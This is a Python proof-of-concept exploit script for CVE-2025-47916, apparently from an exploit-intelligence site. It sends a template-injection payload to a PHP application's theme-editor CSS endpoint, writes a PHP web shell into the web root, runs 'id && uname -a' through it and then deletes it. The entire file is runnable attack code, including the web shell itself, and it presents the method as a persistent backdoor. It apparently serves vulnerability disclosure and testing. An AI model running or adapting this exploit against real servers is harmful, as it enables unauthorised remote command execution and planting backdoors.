#!/usr/bin/env python3
"""
CVE-2025-47916 — Web Shell Deployment via File Write (Vector 3)
Exploit Intelligence Platform | https://exploit-intel.com | @exploit_intel

Demonstrates post-exploitation persistence: writes a PHP web shell to the web
root via file_put_contents(), verifies it, executes commands through it, then
cleans up via unlink().

Usage:
    python3 poc_vector3.py <target_host> [port]
"""

import sys
import base64
import urllib.request
import urllib.parse
import urllib.error
import argparse
import random
import string
import time


OUTPUT_MARKER = "________"


def send_exploit(target_host, target_port, payload):
    """Send the exploit POST request."""
    url = f"http://{target_host}:{target_port}/index.php"
    params = {
        "app": "core",
        "module": "system",
        "controller": "themeeditor",
        "do": "customCss",
        "content": payload,
    }
    data = urllib.parse.urlencode(params).encode("utf-8")
    req = urllib.request.Request(
        url, data=data,
        headers={
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        method="POST",
    )
    try:
        resp = urllib.request.urlopen(req, timeout=30)
        return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body
    except Exception as e:
        return None, str(e)


def extract_output(body):
    if OUTPUT_MARKER in body:
        return body.split(OUTPUT_MARKER)[0].strip()
    return None


def exploit(target_host, target_port):
    """
    Demonstrate web shell deployment via SSTI file write.

    This shows a realistic attack chain:
    1. Use SSTI to write a PHP web shell to the document root
    2. Access the web shell via a normal GET request
    3. Execute commands through the web shell
    4. Clean up the web shell
    """
    print(f"[*] CVE-2025-47916: Web Shell Deployment Vector")
    print(f"[*] Target: http://{target_host}:{target_port}/")
    print()

    # Generate a random shell filename to avoid collisions
    shell_name = "." + "".join(random.choices(string.ascii_lowercase, k=8)) + ".php"
    shell_path = f"/var/www/html/{shell_name}"
    shell_url = f"http://{target_host}:{target_port}/{shell_name}"

    # The web shell is intentionally minimal — just echoes command output
    # between markers for clean extraction. A real attacker would use
    # something more sophisticated (obfuscated, authenticated, etc.)
    shell_content = '<?php if(isset($_GET["c"])){echo "SHELL_OK|";echo system($_GET["c"]);echo "|SHELL_END";} ?>'

    # ── Step 1: Write web shell via SSTI ────────────────────────────────
    print(f"[*] Step 1: Writing web shell to {shell_path}")

    # Use file_put_contents() through the eval payload to write the shell
    write_code = f"file_put_contents('{shell_path}', base64_decode('{base64.b64encode(shell_content.encode()).decode()}'))"
    write_payload = '{expression="die(\'' + OUTPUT_MARKER + '\'.' + write_code + ')"}'

    status, body = send_exploit(target_host, target_port, write_payload)

    if status is None:
        print("[-] Failed to connect to target")
        return False

    if status == 403:
        print("[-] HTTP 403 — target appears patched")
        return False

    # file_put_contents returns bytes written; die() outputs marker + byte count
    if OUTPUT_MARKER in (body or ""):
        print(f"[+] Web shell written successfully")
    else:
        print(f"[-] Web shell write may have failed (HTTP {status})")
        print(f"[-] Response: {(body or '')[:200]}")
        # Continue anyway — the write may have succeeded before die()
    print()

    # Small delay to ensure the file is flushed to disk
    time.sleep(0.5)

    # ── Step 2: Verify web shell is accessible ──────────────────────────
    print(f"[*] Step 2: Verifying web shell at {shell_url}")

    try:
        verify_url = f"{shell_url}?c=echo+WEBSHELL_TEST"
        req = urllib.request.Request(verify_url, headers={"User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, timeout=10)
        verify_body = resp.read().decode("utf-8", errors="replace")

        if "SHELL_OK|" in verify_body and "WEBSHELL_TEST" in verify_body:
            print(f"[+] Web shell is LIVE and responding!")
        else:
            print(f"[!] Web shell responded but output unexpected: {verify_body[:200]}")
    except urllib.error.HTTPError as e:
        print(f"[-] Web shell not accessible: HTTP {e.code}")
        # Try cleanup anyway
        _cleanup_shell(target_host, target_port, shell_path)
        return False
    except Exception as e:
        print(f"[-] Web shell verification failed: {e}")
        _cleanup_shell(target_host, target_port, shell_path)
        return False
    print()

    # ── Step 3: Execute command through web shell ───────────────────────
    print("[*] Step 3: Executing 'id && uname -a' through web shell")

    try:
        cmd_url = f"{shell_url}?c=" + urllib.parse.quote("id && uname -a")
        req = urllib.request.Request(cmd_url, headers={"User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, timeout=10)
        cmd_body = resp.read().decode("utf-8", errors="replace")

        if "SHELL_OK|" in cmd_body:
            # Extract between SHELL_OK| and |SHELL_END
            start = cmd_body.index("SHELL_OK|") + len("SHELL_OK|")
            end = cmd_body.index("|SHELL_END") if "|SHELL_END" in cmd_body else len(cmd_body)
            cmd_output = cmd_body[start:end].strip()
            print(f"[+] Command executed via web shell!")
            print()
            print("--- Web Shell Output ---")
            print(cmd_output)
            print("------------------------")
        else:
            print(f"[-] Unexpected response: {cmd_body[:200]}")
    except Exception as e:
        print(f"[-] Command execution via web shell failed: {e}")
    print()

    # ── Step 4: Cleanup — remove the web shell ──────────────────────────
    print(f"[*] Step 4: Cleaning up web shell at {shell_path}")
    _cleanup_shell(target_host, target_port, shell_path)
    print()

    # ── Step 5: Verify cleanup ──────────────────────────────────────────
    print("[*] Step 5: Verifying cleanup...")
    try:
        req = urllib.request.Request(shell_url, headers={"User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, timeout=5)
        print("[!] WARNING: Web shell still accessible after cleanup!")
    except urllib.error.HTTPError as e:
        if e.code == 404:
            print("[+] Web shell removed successfully (404 Not Found)")
        else:
            print(f"[!] Unexpected status: HTTP {e.code}")
    except Exception as e:
        print(f"[+] Web shell appears removed: {e}")
    print()

    print("[+] WEB SHELL DEPLOYMENT CONFIRMED — demonstrates file write + persistence capability")
    print("[+] This proves the SSTI can be used for persistent backdoor deployment,")
    print("[+] not just one-shot command execution.")
    return True


def _cleanup_shell(target_host, target_port, shell_path):
    """Remove the deployed web shell using the SSTI vulnerability."""
    cleanup_code = f"unlink('{shell_path}')"
    cleanup_payload = '{expression="die(\'' + OUTPUT_MARKER + '\'.' + cleanup_code + ')"}'
    status, body = send_exploit(target_host, target_port, cleanup_payload)
    if status and status < 400:
        print(f"[+] Cleanup request sent (HTTP {status})")
    else:
        print(f"[!] Cleanup may have failed (HTTP {status}) — manual removal may be needed:")
        print(f"    docker exec <container> rm {shell_path}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2025-47916 Vector 3: Web Shell Deployment via File Write"
    )
    parser.add_argument("target", help="Target host (IP or hostname)")
    parser.add_argument("port", nargs="?", type=int, default=80, help="Target port (default: 80)")

    args = parser.parse_args()

    success = exploit(args.target, args.port)
    sys.exit(0 if success else 1)
